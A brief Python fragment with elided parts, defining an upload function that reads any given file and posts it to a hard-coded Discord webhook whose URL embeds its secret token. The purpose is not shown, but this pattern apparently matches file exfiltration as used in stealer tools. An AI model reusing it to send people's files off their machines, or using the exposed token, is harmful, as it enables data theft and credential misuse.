...
def upload(file_path):
    ...
    with open(file_path, "rb") as file:
        response = requests.post('https://discord.com/api/webhooks/1302583012566896740/tOB6sCsQIbv-rRD6hwmvMUWsypS9OJHlovD6PuvqSId4g-zAIW5qjq2grXBSFBr42iDJ', files={"file": file})
